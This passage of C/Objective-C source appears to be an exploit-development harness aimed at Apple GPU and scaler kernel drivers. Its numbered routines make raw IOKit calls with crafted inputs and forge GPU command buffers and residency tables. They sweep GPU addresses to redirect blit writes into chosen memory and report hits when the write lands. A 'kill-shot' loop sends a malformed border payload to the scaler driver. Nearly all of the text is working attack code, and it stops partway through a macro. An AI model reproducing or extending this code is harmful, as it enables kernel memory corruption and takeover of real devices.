// V70: blit fill replay — simplest GPU write (no shader). Fill GPUVA space
// with our sel8 resources first; scan them for 0x5A after submit.
static void p_blitwrite(void) {
    LOG("[v70] blit write replay");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[bw] bind fail"); return; }

    // populate GPUVA space with our resources (16KB each)
    uint8_t *tbufs[40]; int nt = 0;
    for (int i = 0; i < 40; i++) {
        tbufs[i] = must_map(0x4000);
        memset(tbufs[i], 0x41, 0x4000);
        uint32_t r = gpu_resource(c, tbufs[i], 0x4000);
        if (!r) { LOG("[bw] resource %d failed", i); break; }
        nt++;
    }
    LOG("[bw] created %d target resources", nt);

    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    uint8_t *aux1 = must_map(0x1000);
    uint8_t *aux2 = must_map(0x1000);
    memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    memcpy(vaA, agx_A4_image, 0x4000);
    memcpy(vaB, agx_B4_image, 0x4000);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;
    *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
    *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
    // GPUVA sweep: submit with +0x340 (and mirror) sweeping the plausible range;
    // hit = 0x5A appears in one of our 40 resources.
    for (uint64_t g = 0x100000000ULL; g < 0x100200000ULL; g += 0x4000) {
        memcpy(vaA, agx_A4_image, 0x4000);
        memcpy(vaB, agx_B4_image, 0x4000);
        *(uint64_t *)(vaA + 0xac + 0x340) = g;
        *(uint64_t *)(vaA + 0xa28) = g;
        memset(entry, 0, 0x1000);
        *(uint32_t *)(entry + 0x00) = idA;
        *(uint32_t *)(entry + 0x04) = idB;
        *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
        *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        usleep(20000);
        for (int i = 0; i < nt; i++) {
            if (tbufs[i][0] == 0x5A || tbufs[i][0x2000] == 0x5A) {
                long c5 = 0;
                for (int j2 = 0; j2 < 0x4000; j2++) if (tbufs[i][j2] == 0x5A) c5++;
                LOG("[bw] HIT tbuf[%d] %ld 0x5A bytes at GPUVA 0x%llx (kr 0x%08x outw %08x)", i, c5, g, kt, *outw);
            }
        }
        if ((g & 0xfffff) == 0) LOG("[bw] sweep at 0x%llx alive", g);
    }
    // blit loop: hammer accepted blit submits (visual-correlation test)
    LOG("[v70b] blit loop start (watch the screen)");
    for (long r = 0; r < 20000; r++) {
        memcpy(vaA, agx_A4_image, 0x4000);
        memcpy(vaB, agx_B4_image, 0x4000);
        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        if (k2 != 0 && (r & 0x3ff) == 0) LOG("[v70b] r%ld kr 0x%08x", r, k2);
        if ((r & 0xff) == 0) usleep(2000);
        if (r && (r % 5000) == 0) LOG("[v70b] r%ld alive", r);
    }
    LOG("[v70b] blit loop done");
    LOG("[v70] sweep done (alive)");
    LOG("[v70] done (alive)");
}


// V72: learn our resource GPUVA — create sel8 resource with wire flag
// (in+0x16 bit0) and dump the full 0x58 out struct for GPUVA-looking fields.
static void p_gpuva(void) {
    LOG("[v72] resource GPUVA discovery");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *buf = must_map(0x4000);
    memset(buf, 0x41, 0x4000);
    static const uint8_t f16[] = { 0, 1, 2, 3, 6, 7 };
    for (unsigned v = 0; v < sizeof(f16); v++) {
        uint8_t *in = must_map(0x1000);
        uint8_t *out = must_map(0x1000);
        memset(in, 0, 0x1000); memset(out, 0, 0x1000);
        *(uint32_t *)(in + 0x00) = 0x80;
        *(uint32_t *)(in + 0x30) = 1;
        in[0x16] = f16[v];
        *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf + 0x4000;
        *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf;
        *(uint64_t *)(in + 0x48) = 0x4000;
        size_t osz = 0x58;
        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
        kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
        LOG("[gv] f16 %02x -> kr 0x%08x out:", f16[v], kr);
        uint64_t *q = (uint64_t *)out;
        for (int i = 0; i < 11; i += 4)
            LOG("[gv]   +%02x: %016llx %016llx %016llx %016llx", i*8, q[i], q[i+1], q[i+2], q[i+3]);
        vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
        vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
    }
    LOG("[v72] done");
}


// V73: IORegistry dump of IOGPUResource objects (find GPUVA property)
static void p_regdump(void) {
    LOG("[v73] IORegistry IOGPUResource dump");
    static const char *classes[] = { "IOGPUResource", "IOGPUSysMemory", "AGXDevice", "IOGPUDevice", NULL };
    for (int ci = 0; classes[ci]; ci++) {
        io_iterator_t it = 0;
        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
                             IOServiceMatching(classes[ci]), &it);
        if (kr || !it) { LOG("[rg] %s: none", classes[ci]); continue; }
        int n = 0;
        io_registry_entry_t e;
        while ((e = IOIteratorNext(it)) && n < 3) {
            CFMutableDictionaryRef props = NULL;
            if (IORegistryEntryCreateCFProperties(e, &props, NULL, 0) == 0 && props) {
                CFIndex cnt = CFDictionaryGetCount(props);
                LOG("[rg] %s[%d]: %ld props", classes[ci], n, (long)cnt);
                // dump keys
                CFTypeRef *keys = malloc(cnt * sizeof(CFTypeRef));
                CFDictionaryGetKeysAndValues(props, keys, NULL);
                for (CFIndex k = 0; k < cnt && k < 20; k++) {
                    CFStringRef ks = keys[k];
                    char buf[96]; CFStringGetCString(ks, buf, 96, kCFStringEncodingUTF8);
                    LOG("[rg]   key: %s", buf);
                }
                free(keys);
                CFRelease(props);
            }
            IOObjectRelease(e);
            n++;
        }
        IOObjectRelease(it);
    }
    LOG("[v73] done");
}


// V74: sel45 mapping path — for each resource-creation flag, create then bind.
static void p_gpuva2(void) {
    LOG("[v74] sel45 GPU mapping");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint8_t *tgt = must_map(0x40000);
    memset(tgt, 0x41, 0x40000);
    memset(out, 0, 0x1000);
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10; nosc = 0;
    IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    uint64_t qin[2] = {0, 0}, qout[2] = {0, 0};
    uint32_t qc = 2;
    IOConnectCallScalarMethod(c, 42, qin, 2, qout, &qc);
    uint64_t vmid = qout[0];
    uint64_t a44[2] = { vmid, nqid };
    kern_return_t k44 = IOConnectCallScalarMethod(c, 44, a44, 2, NULL, NULL);
    LOG("[m45] nqid %llu vmid %llu attach 0x%08x", nqid, vmid, k44);
    if (k44) return;

    static const uint8_t rf[] = { 0, 1, 2, 3, 6, 7, 0x40, 0x42 };
    for (unsigned v = 0; v < sizeof(rf); v++) {
        uint8_t *i2 = must_map(0x1000);
        uint8_t *o2 = must_map(0x1000);
        memset(i2, 0, 0x1000); memset(o2, 0, 0x1000);
        *(uint32_t *)(i2 + 0x00) = 0x80;
        *(uint32_t *)(i2 + 0x30) = 1;
        i2[0x16] = rf[v];
        *(uint64_t *)(i2 + 0x38) = (uint64_t)(uintptr_t)tgt + 0x4000;
        *(uint64_t *)(i2 + 0x40) = (uint64_t)(uintptr_t)tgt;
        *(uint64_t *)(i2 + 0x48) = 0x4000;
        size_t os2 = 0x58; uint32_t n2 = 0; uint64_t oc2[4] = {0,0,0,0};
        kern_return_t k9 = IOConnectCallMethod(c, 8, NULL, 0, i2, 0x68, oc2, &n2, o2, &os2);
        uint32_t r2 = *(uint32_t *)(o2 + 0x24);
        if (k9 || !r2) { LOG("[m45] f16 %02x create kr 0x%08x", rf[v], k9); continue; }
        memset(in, 0, 0x1000);
        *(uint32_t *)(in + 0x00) = 1;
        *(uint32_t *)(in + 0x08) = r2;
        *(uint32_t *)(in + 0x0c) = 0;
        *(uint64_t *)(in + 0x10) = 0x100000;
        *(uint8_t  *)(in + 0x18) = 0;
        nosc = 0;
        kern_return_t kb = IOConnectCallMethod(c, 45, NULL, 0, in, 0x20, osc, &nosc, NULL, NULL);
        LOG("[m45] f16 %02x rid %u: sel45 -> kr 0x%08x", rf[v], r2, kb);
        vm_deallocate(mach_task_self(), (vm_address_t)i2, 0x1000);
        vm_deallocate(mach_task_self(), (vm_address_t)o2, 0x1000);
        usleep(20000);
    }
    LOG("[v74] done (alive)");
}


// V76: blit with our resource GPU-mapped via entry+0x20 (prepare reference),
// then fine GPUVA sweep at +0x340; read resource for 0x5A.
static void p_blithit(void) {
    LOG("[v76] blit with prepared resource + fine GPUVA sweep");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[bh] bind fail"); return; }

    // our target resource
    uint8_t *tgt = must_map(0x40000);
    memset(tgt, 0x41, 0x40000);
    uint32_t rid = gpu_resource(c, tgt, 0x40000);
    LOG("[bh] target rid %u", rid);
    if (!rid) return;

    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    uint8_t *aux1 = must_map(0x1000);
    uint8_t *aux2 = must_map(0x1000);
    memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    int ridslot = 0;

    // combined: all resource-id slots = our rid, +0x340 = candidate GPUVA
    // candidate: out+0x00 of our rid = {hi=0x100, lo=offset}; GPUVA guess = 0x1_00000000|lo
    uint64_t mygpu = 0x100000000ULL | (g_last_res_off & 0xffffffff);
    LOG("[bh] all-slots=rid %u, candidate GPUVA 0x%llx", rid, mygpu);
    for (ridslot = 0; ridslot < 1; ridslot++) {   // single iteration now
        uint64_t g = mygpu;
        memcpy(vaA, agx_A4_image, 0x4000);
        memcpy(vaB, agx_B4_image, 0x4000);
        *(uint64_t *)(vaA + 0xac + 0x340) = g;
        *(uint64_t *)(vaA + 0xa28) = g;
        memset(entry, 0, 0x1000);
        *(uint32_t *)(entry + 0x00) = idA;
        *(uint32_t *)(entry + 0x04) = idB;
        *(uint32_t *)(entry + 0x20) = rid;          // prepare reference -> GPU-map our resource
        for (int rs = 0; rs < 0x40; rs++)           // patch ALL resource-id slots
            *(uint32_t *)(vaB + 0x40 + rs * 4) = rid;
        *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
        *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
        *outw = 0xdeadbeef;
        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
        usleep(5000);
        if (tgt[0] == 0x5A || tgt[0x20000] == 0x5A || tgt[0x3fff0] == 0x5A) {
            long c5 = 0;
            for (long j = 0; j < 0x40000; j++) if (tgt[j] == 0x5A) c5++;
            LOG("[bh] *** HIT slot %d: %ld 0x5A bytes (kr 0x%08x outw %08x)", ridslot, c5, kt, *outw);
        }
        if ((ridslot & 7) == 0) LOG("[bh] slot %d alive", ridslot);
    }
    LOG("[v76] sweep done (alive)");
}


// V79: isolated border-fill kill-shot loop (glitch correlation test)
static void p_killshot_only(void) {
    LOG("[v79] isolated kill-shot loop (watch screen!)");
    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
    if (!c) { LOG("[ks] no scaler conn"); return; }
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    uint8_t *req = must_map(0x1000);
    // wire once
    craft_transform(req, si, di, 64, 64);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    IOConnectCallMethod(c, 1, NULL, 0, req, 0x1b0, osc, &nosc, NULL, NULL);
    usleep(50000);
    for (int i = 0; i < 40; i++) {
        border_payload(req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
        kern_return_t kr = IOConnectCallMethod(c, 1, NULL, 0, req, 0x1b0, osc, &nosc, NULL, NULL);
        LOG("[ks] shot %d -> kr 0x%08x", i, kr);
        usleep(300000);
    }
    LOG("[v79] done (alive)");
}


// V80: proper GPUVA resource (Metal flags) + blit redirect to it. Read back.
static void p_gpuwrite(void) {
    LOG("[v80] GPUVA-correct blit redirect");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[gw] bind fail"); return; }

    // resource with Metal shared-buffer flags
    uint8_t *tgt = must_map(0x10000);
    memset(tgt, 0x41, 0x10000);
    uint8_t *i2 = must_map(0x1000);
    uint8_t *o2 = must_map(0x1000);
    memset(i2, 0, 0x1000); memset(o2, 0, 0x1000);
    *(uint32_t *)(i2 + 0x00) = 0x80;
    *(uint32_t *)(i2 + 0x08) = 0x10001;
    *(uint16_t *)(i2 + 0x0c) = 1;
    *(uint32_t *)(i2 + 0x14) = 0x1000450;    // Metal shared-buffer map flags
    *(uint32_t *)(i2 + 0x30) = 1;
    *(uint64_t *)(i2 + 0x38) = (uint64_t)(uintptr_t)tgt;          // CPU backing
    *(uint64_t *)(i2 + 0x40) = (uint64_t)(uintptr_t)tgt;
    *(uint64_t *)(i2 + 0x48) = 0x10000;
    size_t os2 = 0x58; uint32_t n2 = 0;
    kern_return_t k9 = IOConnectCallMethod(c, 8, NULL, 0, i2, 0x68, osc, &nosc, o2, &os2);
    uint64_t gpuva = *(uint64_t *)(o2 + 0x00);
    uint32_t rid = *(uint32_t *)(o2 + 0x24);
    LOG("[gw] flagged resource: kr 0x%08x rid %u GPUVA 0x%llx (cpuptr %llx)",
        k9, rid, gpuva, *(uint64_t *)(o2 + 0x08));

    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    // fake command-buffer-storage with residency table:
    // aux1 = storage (table ptr @+0x300, count @+0x318), aux2 = resource table
    uint8_t *aux1 = must_map(0x1000);
    uint8_t *aux2 = must_map(0x1000);
    memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
    *(uint64_t *)(aux1 + 0x300) = (uint64_t)(uintptr_t)aux2;   // resource table ptr
    *(uint32_t *)(aux1 + 0x318) = 4;                           // table capacity
    // residency entry 0 (0x40 bytes): our resource
    *(uint64_t *)(aux2 + 0x00) = gpuva;                        // GPUVA
    *(uint64_t *)(aux2 + 0x08) = (uint64_t)(uintptr_t)tgt;     // CPU ptr
    *(uint64_t *)(aux2 + 0x10) = gpuva + 0x10000;              // end
    *(uint64_t *)(aux2 + 0x18) = (uint64_t)(uintptr_t)tgt;     // CPU ptr
    *(uint64_t *)(aux2 + 0x38) = rid;                          // resource id
    uint32_t *outw = (uint32_t *)must_map(0x100);

    // blit with our real GPUVA
    memcpy(vaA, agx_A4_image, 0x4000);
    memcpy(vaB, agx_B4_image, 0x4000);
    *(uint64_t *)(vaA + 0xac + 0x340) = gpuva;
    *(uint64_t *)(vaA + 0xa28) = gpuva;
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;
    *(uint32_t *)(entry + 0x20) = rid;              // residency
    *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
    *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
    *outw = 0xdeadbeef;
    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
    LOG("[gw] submit GPUVA 0x%llx -> kr 0x%08x outw %08x", gpuva, kt, *outw);
    usleep(500000);
    long c5 = 0;
    for (int i = 0; i < 0x10000; i++) if (tgt[i] == 0x5A) c5++;
    LOG("[gw] *** target 0x5A bytes: %ld / 0x10000 %s", c5, c5 ? "WRITE OBSERVED!" : "(no write)");
    LOG("[v80] done (alive)");
}


// V83: Metal-format replay. new_resource format B (pure shared alloc, type 0x00),
// typed shmems (sel12 type arg), segment list with 6-pack resource groups.
// gpu_shmem_t: sel12 with explicit shmem type (0=segment list, 1=kernel cmd,
// 2=debug, 3=sideband). Old gpu_shmem (always type 0) is left untouched.
static uint32_t gpu_shmem_t(io_connect_t c, uint64_t size, uint64_t type, uint8_t **va_out) {
    uint8_t *out = must_map(0x1000);
    memset(out, 0, 0x1000);
    uint64_t a[2] = { size, type };
    size_t osz = 0x10;
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(c, 12, a, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t va = *(uint64_t *)out;
    uint32_t id = *(uint32_t *)(out + 0xc);
    LOG("[mtlr] sel12 size 0x%llx type %llu -> kr 0x%08x va %llx id %u", size, type, kr, va, id);
    vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
    if (kr) return 0;
    *va_out = (uint8_t *)(uintptr_t)va;
    return id;
}

// gpu_resource2: Metal "format B" (0x68 bytes), type 0x00 = pure shared alloc.
// NB: the offsets come from a real Metal trace (macOS 27, sel 9, stInSz 104):
//   +0x00 u32 type=0 | +0x08 u32 0x00010001 | +0x0c u32 1 |
//   +0x10 u32 0x01000101 | +0x14 u32 flags (0x470 traced) | +0x30 qword 1 |
//   +0x48 qword sysMemSize | rest 0
// (the earlier spec draft had +0x10..+0x58 shifted one qword down — wrong).
// On macOS the selector is 9; on iOS our sel 8 accepted format A — try both.
// Returns rid; *gpuva_out = GPUVA (expect space 0x1: hi dword 0x100),
// *cpu_out = CPU data pointer (out+0x08), may be NULL.
static uint32_t gpu_resource2(io_connect_t c, uint64_t size, uint64_t *gpuva_out, uint8_t **cpu_out) {
    static const uint32_t sels[]   = { 8, 9 };
    static const uint32_t flagvs[] = { 0x470, 0x1000470 };
    for (unsigned s = 0; s < sizeof(sels)/sizeof(sels[0]); s++) {
        for (unsigned f = 0; f < sizeof(flagvs)/sizeof(flagvs[0]); f++) {
            uint8_t *in = must_map(0x1000);
            uint8_t *out = must_map(0x1000);
            memset(in, 0, 0x1000); memset(out, 0, 0x1000);
            *(uint32_t *)(in + 0x00) = 0x00;          // resourceType: pure shared alloc
            *(uint32_t *)(in + 0x08) = 0x00010001;
            *(uint32_t *)(in + 0x0c) = 1;
            *(uint32_t *)(in + 0x10) = 0x01000101;
            *(uint32_t *)(in + 0x14) = flagvs[f];     // 0x470 = traced Metal value
            *(uint64_t *)(in + 0x30) = 1;
            *(uint64_t *)(in + 0x48) = size;          // sysMemSize
            size_t osz = 0x58;
            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
            kern_return_t kr = IOConnectCallMethod(c, sels[s], NULL, 0, in, 0x68, osc, &nosc, out, &osz);
            uint64_t gpuva = *(uint64_t *)(out + 0x00);
            uint64_t cpup  = *(uint64_t *)(out + 0x08);
            uint32_t rid   = *(uint32_t *)(out + 0x24);
            LOG("[mtlr] resource2 sel%u flags %x sz 0x%llx -> kr 0x%08x rid %u GPUVA 0x%llx cpu %llx",
                sels[s], flagvs[f], size, kr, rid, gpuva, cpup);
            if (!kr && rid) {
                uint64_t *q = (uint64_t *)out;
                LOG("[mtlr]   out: %016llx %016llx %016llx %016llx", q[0], q[1], q[2], q[3]);
                LOG("[mtlr]   out: %016llx %016llx %016llx %016llx", q[4], q[5], q[6], q[7]);
                vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
                vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
                *gpuva_out = gpuva;
                *cpu_out = (uint8_t *)(uintptr_t)cpup;
                return rid;
            }
            vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
            vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
        }
    }
    return 0;
}

static void p_mtlreplay(void) {
    LOG("[mtlr] Metal-format replay: format-B resources + 6-pack segment list");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[mtlr] bind fail"); return; }
    LOG("[mtlr] setup: nq %llu qid %llu", nqid, qid);

    // Metal-style shared buffers; 0x10000 matches the captured fill range.
    // A/B mirror the capture's res0 (shader-cache/pool metadata @0x1_00000000)
    // and res1 (dest @0x1_00018000); C mirrors res2 (pool tables @0x1_00030000).
    const uint64_t BSZ = 0x10000;
    uint64_t gpuvaA = 0, gpuvaB = 0, gpuvaC = 0;
    uint8_t *cpuA = NULL, *cpuB = NULL, *cpuC = NULL;
    uint32_t ridA = gpu_resource2(c, BSZ, &gpuvaA, &cpuA);
    uint32_t ridB = gpu_resource2(c, BSZ, &gpuvaB, &cpuB);
    uint32_t ridC = gpu_resource2(c, 0x20000, &gpuvaC, &cpuC);
    if (!ridA || !ridB) { LOG("[mtlr] resource2 failed (ridA %u ridB %u)", ridA, ridB); return; }
    LOG("[mtlr] A: rid %u GPUVA 0x%llx cpu %p | B: rid %u GPUVA 0x%llx cpu %p | C: rid %u GPUVA 0x%llx cpu %p",
        ridA, gpuvaA, cpuA, ridB, gpuvaB, cpuB, ridC, gpuvaC, cpuC);
    LOG("[mtlr] space-0x1 check: A %d B %d C %d (hi dword 0x100 expected)",
        (uint32_t)(gpuvaA >> 32) == 0x100, (uint32_t)(gpuvaB >> 32) == 0x100,
        (uint32_t)(gpuvaC >> 32) == 0x100);
    LOG("[mtlr] capture-offset check: A==0x1_00000000:%d B==0x1_00018000:%d C==0x1_00030000:%d",
        gpuvaA == 0x10000000000ULL, gpuvaB == 0x10000018000ULL, gpuvaC == 0x10000030000ULL);
    if (!cpuA || !cpuB) { LOG("[mtlr] no CPU mapping returned, cannot drive/verify; abort"); return; }
    // exact captured contents (bundled); fallback: 0x41 fill
    int have_assets = 0;
    {
        NSBundle *mb = [NSBundle mainBundle];
        NSString *p0 = [mb pathForResource:@"res0_metacache" ofType:@"bin"];
        NSString *p1 = [mb pathForResource:@"res1_dest" ofType:@"bin"];
        NSString *p2 = [mb pathForResource:@"res2_pool" ofType:@"bin"];
        NSData *d0 = p0 ? [NSData dataWithContentsOfFile:p0] : nil;
        NSData *d1 = p1 ? [NSData dataWithContentsOfFile:p1] : nil;
        NSData *d2 = p2 ? [NSData dataWithContentsOfFile:p2] : nil;
        if (d0.length == BSZ && d1.length == BSZ && d2.length == 0x20000 && cpuC) {
            memcpy(cpuA, d0.bytes, BSZ);
            memcpy(cpuB, d1.bytes, BSZ);
            memcpy(cpuC, d2.bytes, 0x20000);
            have_assets = 1;
        }
    }
    LOG("[mtlr] assets: %s", have_assets ? "captured contents loaded" : "MISSING, 0x41 fallback");
    if (!have_assets) {
        memset(cpuA, 0x41, BSZ);    // pattern
        memset(cpuB, 0, BSZ);       // zeroed target
        if (cpuC) memset(cpuC, 0, 0x20000);
    }

    uint8_t *vaCmd, *vaSeg, *vaCmd0;
    // creation order mirrors the capture: segment list first (id 1), then the
    // kernel command buffer (id 2) — the captured submit entry was {2, 1}.
    uint32_t idSeg = gpu_shmem_t(c, 0x4000, 0, &vaSeg);   // segment list
    uint32_t idCmd = gpu_shmem_t(c, 0x4000, 1, &vaCmd);   // kernel command buffer (typed)
    uint32_t idCmd0 = gpu_shmem(c, 0x4000, &vaCmd0);      // legacy type-0 cmd shmem
    if (!idCmd || !idSeg || !idCmd0) return;
    uint8_t *entry = must_map(0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    // capture-faithful completion: two pointers 0x30 apart in one buffer
    uint8_t *comp = must_map(0x1000);
    memset(comp, 0, 0x1000);
    // v80-style userspace completion/aux: storage with residency table for B
    uint8_t *aux1 = must_map(0x1000);
    uint8_t *aux2 = must_map(0x1000);
    memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
    *(uint64_t *)(aux1 + 0x300) = (uint64_t)(uintptr_t)aux2;   // resource table ptr
    *(uint32_t *)(aux1 + 0x318) = 4;                           // table capacity
    *(uint64_t *)(aux2 + 0x00) = gpuvaB;
    *(uint64_t *)(aux2 + 0x08) = (uint64_t)(uintptr_t)cpuB;
    *(uint64_t *)(aux2 + 0x10) = gpuvaB + BSZ;
    *(uint64_t *)(aux2 + 0x18) = (uint64_t)(uintptr_t)cpuB;
    *(uint64_t *)(aux2 + 0x38) = ridB;

    // Fill a cmd shmem with the full captured image; remap every space-0x1
    // GPUVA ref: dest (0x1_00018000) -> gpuvaB, all others -> into buffer A.
    // Optionally put a residency list {2, ridA, ridB} into the nop @+8.
#define MTLR_FILL_CMD(va, resid) do { \
        uint8_t *_v = (va); \
        memcpy(_v, agx_A4_image, 0x4000); \
        for (long _o = 0; _o < 0x1000 - 8; _o += 4) { \
            uint64_t _q = *(uint64_t *)(_v + _o); \
            if ((_q >> 32) == 0x100) { \
                if ((_q & 0xffffffff) == 0x18000) *(uint64_t *)(_v + _o) = gpuvaB; \
                else *(uint64_t *)(_v + _o) = gpuvaA + (_q & 0x3fff); \
            } \
        } \
        if (resid) { \
            *(uint32_t *)(_v + 0x08) = 2; \
            *(uint32_t *)(_v + 0x0c) = ridA; \
            *(uint32_t *)(_v + 0x10) = ridB; \
        } \
    } while (0)

    // Fill seglist shmem. style 0: hand-built per spec B (KCL count=2 finalized).
    // style 1: capture-faithful (agx_B4_image verbatim) + 6-pack group at +0x48,
    // numResources/numResourceGroups patched into the segment.
#define MTLR_FILL_SEG(va, style, usage) do { \
        uint8_t *_v = (va); \
        memset(_v, 0, 0x4000); \
        uint8_t *_g6; \
        if ((style) == 0) { \
            *(uint32_t *)(_v + 0x08) = 2; \
            *(uint32_t *)(_v + 0x0c) = 0xc0000001; \
            *(uint32_t *)(_v + 0x10) = 0; \
            *(uint32_t *)(_v + 0x14) = 0xac; \
            *(uint32_t *)(_v + 0x18) = 0xac; \
            *(uint32_t *)(_v + 0x1c) = 0x404; \
            *(uint32_t *)(_v + 0x28) = 1; \
            *(uint32_t *)(_v + 0x2c) = 0x80000070; \
            *(uint32_t *)(_v + 0x38) = 0xac; \
            *(uint32_t *)(_v + 0x3c) = 0x404; \
            *(uint32_t *)(_v + 0x48) = 2; \
